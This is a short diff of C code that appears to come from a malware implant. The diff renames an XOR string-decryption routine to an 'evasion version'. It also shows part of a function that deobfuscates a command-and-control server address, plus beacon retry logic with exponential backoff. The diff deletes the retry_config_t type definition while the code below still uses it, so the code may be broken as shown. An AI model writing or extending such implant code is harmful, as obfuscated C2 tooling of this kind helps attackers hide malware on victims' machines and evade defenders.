@@ -13,8 +13,8 @@ static uint8_t xor_key[16] = {
     0x3F, 0x8A, 0x51, 0xB7, 0x2D, 0xF4, 0x6C, 0x9B
 };
 
-// String decryption
-void decrypt_string(char* str, size_t len) {
+// String decryption (evasion version)
+void decrypt_string_evasion(char* str, size_t len) {
     for (size_t i = 0; i < len; i++) {
         str[i] ^= xor_key[i % 16];
     }
@@ -265,13 +265,7 @@ void deobfuscate_c2_address(char* output, size_t max_len) {
     output[len] = '\0';
 }
 
-// Smart retry logic with exponential backoff and jitter
-typedef struct {
-    int attempt;
-    uint32_t base_delay;
-    uint32_t max_delay;
-} retry_config_t;
-
+// Smart retry logic implementation
 uint32_t calculate_retry_delay(retry_config_t* config) {
     // Exponential backoff: delay = base * 2^attempt
     uint32_t delay = config->base_delay * (1 << config->attempt);
